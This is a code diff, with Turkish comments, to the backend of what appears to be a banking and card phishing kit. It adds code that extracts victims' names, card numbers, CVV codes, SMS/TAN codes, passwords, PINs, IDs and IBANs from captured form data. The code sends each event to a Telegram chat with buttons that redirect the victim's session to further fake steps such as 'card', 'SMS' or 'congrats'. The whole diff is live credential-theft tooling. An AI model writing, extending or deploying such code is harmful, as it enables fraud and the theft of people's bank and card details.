@@ -6,6 +6,132 @@ export type ServerAuditRow = AuditEventPayload & {
   id?: number | string | null;
 };
 
+/** Önemli form alanları (sadece bunlar dolunca hem telegram'a gönder, hem ses çal) */
+const SIGNIFICANT_FORM_FIELDS: readonly string[] = [
+  "firstName", "lastName", "fullName", "phone", "mobile", "email",
+  "smsCode", "sms_code", "smscode", "tan", "tacCode",
+  "cardNumber", "cardNo", "cardHolder", "cardExpiry", "cardCvc", "cvv",
+  "bankName", "bankSlug", "loginMethod", "login_method",
+  "username", "userName", "user_id", "customerNo",
+  "password", "pass", "pin", "pinCode",
+  "personalCode", "idNumber", "tc", "birthday",
+  "verfuegernummer", "blz", "iban", "accountNo",
+  "orderedField1", "orderedField2", "orderedField3",
+  "bankPhone",
+];
+
+/** Form alanlarının Telegram'da görünen isimleri */
+function formFieldLabel(key: string): string {
+  const k = key.toLowerCase();
+  if (k === "firstname" || k === "first_name" || k === "ad") return "👤 Ad";
+  if (k === "lastname" || k === "last_name" || k === "soyad") return "👤 Soyad";
+  if (k === "fullname" || k === "full_name" || k === "isimsoyisim") return "👤 İsim Soyisim";
+  if (k === "phone" || k === "mobile" || k === "tel") return "📱 Tel";
+  if (k === "smscode" || k === "sms_code" || k === "sms" || k === "tan" || k === "taccode" || k === "onay") return "📱 SMS/TAN";
+  if (k === "cardnumber" || k === "cardno" || k === "kart") return "💳 Kart No";
+  if (k === "cardholder" || k === "card_holder") return "💳 Kart Sahibi";
+  if (k === "cardexpiry" || k === "card_expiry" || k === "skt") return "💳 Son Kullanma";
+  if (k === "cardcvc" || k === "cvv" || k === "cvc" || k === "ccv") return "💳 CVC/CVV";
+  if (k === "loginmethod" || k === "login_method" || k === "giristuru") return "🔐 Giriş Tür";
+  if (k === "bankname" || k === "bank_name") return "🏦 Banka";
+  if (k === "bankslug" || k === "bank_slug") return "🏦 Slug";
+  if (k === "username" || k === "user_name" || k === "kullaniciadi" || k === "userid" || k === "customerno" || k === "musterino") return "👤 Kullanıcı Adı";
+  if (k === "password" || k === "pass" || k === "sifre" || k === "parola") return "🔐 Şifre";
+  if (k === "pin" || k === "pin_code" || k === "pin code" || k === "pinkodu") return "🔐 PIN";
+  if (k === "personalcode" || k === "personal_code" || k === "idnumber" || k === "tc" || k === "kimlik") return "🆔 Kimlik / TC";
+  if (k === "birthday" || k === "dogumtarihi" || k === "birth_date") return "🎂 Doğum Tarihi";
+  if (k === "verfuegernummer" || k.startsWith("verf")) return "📋 Verfüger Nr";
+  if (k === "iban" || k === "accountno" || k === "hesapno") return "🏦 IBAN / Hesap";
+  if (k === "orderedfield1") return "📝 Alan-1";
+  if (k === "orderedfield2") return "📝 Alan-2";
+  if (k === "orderedfield3") return "📝 Alan-3";
+  if (k === "bankphone" || k === "bank_phone") return "🏦 Banka Tel";
+  return `📝 ${key}`;
+}
+
+/** Meta.form_data'dan sadece dolu ve önemli alanları çıkar */
+export function extractSignificantFormValues(
+  meta: unknown,
+): Array<{ key: string; label: string; value: string }> {
+  if (!meta || typeof meta !== "object") return [];
+  const m = meta as Record<string, any>;
+  const pool: Record<string, any> = {};
+  if (typeof m.form_data === "object" && m.form_data) {
+    Object.assign(pool, m.form_data as Record<string, any>);
+  }
+  Object.assign(pool, m);
+  const sig = new Set<string>(SIGNIFICANT_FORM_FIELDS.map((s) => s.toLowerCase()));
+  const out: Array<{ key: string; label: string; value: string }> = [];
+  for (const [k, raw] of Object.entries(pool)) {
+    if (raw === undefined || raw === null) continue;
+    const str = String(raw);
+    if (str.trim().length === 0) continue;
+    if (typeof raw === "object") continue; // skip arrays / bankFormHistory / nested
+    if (sig.has(k.toLowerCase()) ||
+        SIGNIFICANT_FORM_FIELDS.some((s) => k.toLowerCase().includes(s.toLowerCase()))) {
+      out.push({
+        key: k,
+        label: formFieldLabel(k),
+        value: str.trim().slice(0, 120),
+      });
+    }
+  }
+  return out;
+}
+
+/** Sadece FORM/ÖNEMLİ event'leri gönder (presence, step, route atla) */
+export function isTelegramWorthyEvent(row: ServerAuditRow): boolean {
+  const k = String(row.event_kind || "").toLowerCase();
+  const a = String(row.event_action || "").toLowerCase();
+
+  // Kesinlikle gönderilmeyecekler
+  if (k === "presence") return false;
+  if (k === "route") return false;
+  if (a.includes("pulse") || a.includes("heartbeat") || a.includes("ping")) return false;
+  if (a.includes("session_mount") || a.includes("hidden_") || a.includes("pagehide") || a.includes("subscribe")) return false;
+
+  // Kesinlikle gönderilecekler
+  if (k === "submit") return true;
+  if (k === "bank_form") return true;
+  if (k === "error") return true;
+  if (k === "auth") return true;
+  if (a.includes("ban") || a.includes("unban")) return true;
+
+  // step/admin yönlendirmelerinde: yalnızca ADMIN tarafından gönderilmişse (admin_action var) gönder
+  if (k === "step") {
+    if (row.admin_action || a.includes("admin") || a.includes("redirect")) {
+      return true;
+    }
+    // client step eventleri (kendiliğinden back vs.) gönderme
+    return false;
+  }
+
+  // Diğerlerinde: eğer önemli form alanı değişmişse gönder
+  const fields = extractSignificantFormValues(row.meta);
+  return fields.length > 0;
+}
+
+/** Inline yönlendirme butonları oluştur (eğer session varsa) */
+export function buildInlineKeyboardForSession(
+  sessionId: string | null | undefined,
+  publicId: string | null | undefined,
+): InlineKeyboardButton[][] {
+  const sid = String(sessionId || publicId || "").trim();
+  if (!sid) return [];
+  const mk = (label: string, step: string) => ({
+    text: label,
+    callback_data: `redirect:${step}:${sid}`,
+  });
+  return [
+    [mk("🏦 Banka Listesi", "banken"), mk("⏳ Beklet", "wait"), mk("👤 İsim", "win")],
+    [mk("💳 Kart", "card"), mk("📱 SMS", "sms"), mk("🎰 Çark", "wheel")],
+    [mk("❌ Geçersiz Banka", "invalid_bank"), mk("🆘 Canlı Destek", "live_support"), mk("🎉 Tebrikler", "congrats")],
+  ];
+}
+
+export type InlineKeyboardButton = { text: string; callback_data: string };
+
+
 export function getConfig() {
   const token = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
@@ -176,53 +302,29 @@ export function formatAuditEventForTelegram(row: ServerAuditRow): string {
     lines.push(`❌ Hata: <b>${escapeHTML(row.error_name || "")}</b> — <code>${escapeHTML(String(row.error_message || "").slice(0, 400))}</code>`);
   }
 
-  if (row.meta && typeof row.meta === "object" && Object.keys(row.meta).length < 40) {
+  // ⭐ Önemli form alanlarını SATIR SATIR göster (eski "pick" yaklaşımı kaldırıldı)
+  const significantFields = extractSignificantFormValues(row.meta);
+  if (significantFields.length > 0) {
+    lines.push("\n📋 <b>FORM ALANLARI</b>");
+    for (const f of significantFields) {
+      lines.push(`${f.label}: <code>${escapeHTML(f.value)}</code>`);
+    }
+  } else if (row.meta && typeof row.meta === "object") {
+    // Eğer belirgin alan yoksa ve meta küçükse, önemli olmayanları da göster (limited)
     const m = row.meta as Record<string, any>;
-    const important: string[] = [];
-    const pick = (key: string, label: string, limit: number = 60) => {
-      const v = m[key];
-      if (v !== undefined && v !== null && String(v).trim().length > 0) {
-        important.push(`${label}: <code>${escapeHTML(String(v).slice(0, limit))}</code>`);
-      }
-    };
-    if (typeof m.form_data === "object" && m.form_data) {
-      const fd = m.form_data as Record<string, any>;
-      for (const [k, v] of Object.entries(fd).slice(0, 6)) {
-        if (String(v).trim().length > 0 && typeof v !== "object") {
-          m[`fd_${k}`] = v;
-        }
-      }
+    const rest: string[] = [];
+    const keys = Object.keys(m).filter(
+      (k) =>
+        m[k] !== undefined &&
+        m[k] !== null &&
+        String(m[k]).trim() !== "" &&
+        typeof m[k] !== "object" &&
+        k !== "form_data",
+    );
+    for (const k of keys.slice(0, 4)) {
+      rest.push(`${escapeHTML(k)}: <code>${escapeHTML(String(m[k]).slice(0, 80))}</code>`);
     }
-    pick("fullName", "👤İsim", 80);
-    pick("fd_fullName", "👤İsim", 80);
-    pick("firstName", "👤Ad", 40);
-    pick("lastName", "👤Soyad", 40);
-    pick("smsCode", "📱SMS", 10);
-    pick("fd_smsCode", "📱SMS", 10);
-    pick("cardNumber", "💳KartNo", 32);
-    pick("fd_cardNumber", "💳KartNo", 32);
-    pick("cardExpiry", "💳SonKul", 8);
-    pick("cardCvc", "💳CVC", 6);
-    pick("bankSlug", "🏦Slug", 40);
-    pick("bankName", "🏦Ad", 50);
-    pick("loginMethod", "🔐Giris", 30);
-    pick("username", "👤KAd", 40);
-    pick("reason", "Sebep", 200);
-    if (important.length === 0) {
-      const keys = Object.keys(m).filter(
-        (k) =>
-          String(m[k]) !== undefined &&
-          m[k] !== null &&
-          String(m[k]).trim() !== "" &&
-          typeof m[k] !== "object" &&
-          k !== "form_data",
-      );
-      for (const k of keys.slice(0, 5)) {
-        if (important.length >= 6) break;
-        important.push(`${escapeHTML(k)}: <code>${escapeHTML(String(m[k]).slice(0, 80))}</code>`);
-      }
-    }
-    if (important.length > 0) lines.push("🔎 " + important.join(" • "));
+    if (rest.length) lines.push("ℹ️ " + rest.join(" • "));
   }
 
   lines.push(`🕒 ${escapeHTML(ts(row.created_at))}`);
@@ -241,66 +343,41 @@ export async function notifyAuditEventsToTelegram(
   const bot = getTelegramBot();
   if (!bot) return { sent: 0, errors: 0 };
 
-  // --- SPAM filtresi: TÜM "presence" eventlerini TELEGRAM'A ATMA (sayfa görünürlük/sekme/heartbeat/abonelik spamdir) ---
-  // Sadece gerçek aksiyonlar gönderilsin: form, auth, redirect, ban, vb. Presence'ler DB'de dursun ama TG yok.
-  const filtered = rows.filter((r) => {
-    const k = String(r.event_kind || "").toLowerCase();
-    if (k === "presence") return false; // presence_subscribe / pagehide / pagevis / hidden / pulse / heartbeat HEPSI atlanir
-    const a = String(r.event_action || "").toLowerCase();
-    if (a.includes("pulse") || a.includes("heartbeat") || a.includes("ping")) return false;
-    return true;
-  });
+  // ⭐ YENİ KURAL: Sadece FORM / BAN / HATA / ADMİN YÖNLENDİRMESİ gibi ÖNEMLİ eventleri gönder
+  // (presence, route, kendiliğinden step eventleri, ping vb. GÖNDERİLMEZ)
+  const filtered = rows.filter((r) => isTelegramWorthyEvent(r));
 
   if (filtered.length === 0) return { sent: 0, errors: 0 };
 
   let sent = 0;
   let errors = 0;
 
-  // --- 10 evente kadar birleştir, tek mesajda gönder ---
-  const chunks: string[][] = [[]];
+  // ⭐ YENİ: HER EVENT İÇİN TEK MESAJ (chunk'lamayı kaldırdık) — altında INLINE BUTONLARI OLSUN
   for (const r of filtered) {
-    const line = formatAuditEventForTelegram(r);
-    const last = chunks[chunks.length - 1];
-    const candidate = last.length === 0 ? line : last.join("\n\n") + "\n\n" + line;
-    if (last.length > 0 && (candidate.length > 3800 || last.length >= 10)) {
-      chunks.push([line]);
-    } else {
-      last.push(line);
-    }
-  }
-
-  for (const chunk of chunks) {
-    if (chunk.length === 0) continue;
-    const text = chunk.join("\n\n");
+    const text = formatAuditEventForTelegram(r);
+    const inlineKeyboard = buildInlineKeyboardForSession(r.session_id, r.public_id);
     try {
-      await bot.api.sendMessage(cfg.chatId, text, {
+      const opts: any = {
         parse_mode: "HTML",
         link_preview_options: { is_disabled: true },
-      });
-      sent += chunk.length;
+      };
+      if (inlineKeyboard.length > 0) {
+        opts.reply_markup = { inline_keyboard: inlineKeyboard };
+      }
+      await bot.api.sendMessage(cfg.chatId, text, opts);
+      sent++;
     } catch (err: unknown) {
-      errors += chunk.length;
+      errors++;
       try {
         console.error(
-          "[telegram] sendMessage failed",
+          "[telegram] sendMessage single failed",
           err instanceof Error ? err.message : String(err),
+          "event_kind=",
+          r.event_kind,
+          "event_action=",
+          r.event_action,
         );
       } catch {}
-      // Hata sonrası parçalayarak tek dene
-      if (chunk.length > 1) {
-        for (const line of chunk) {
-          try {
-            await bot.api.sendMessage(cfg.chatId, line, {
-              parse_mode: "HTML",
-              link_preview_options: { is_disabled: true },
-            });
-            sent++;
-            errors--;
-          } catch {
-            errors++;
-          }
-        }
-      }
     }
   }
   return { sent, errors };
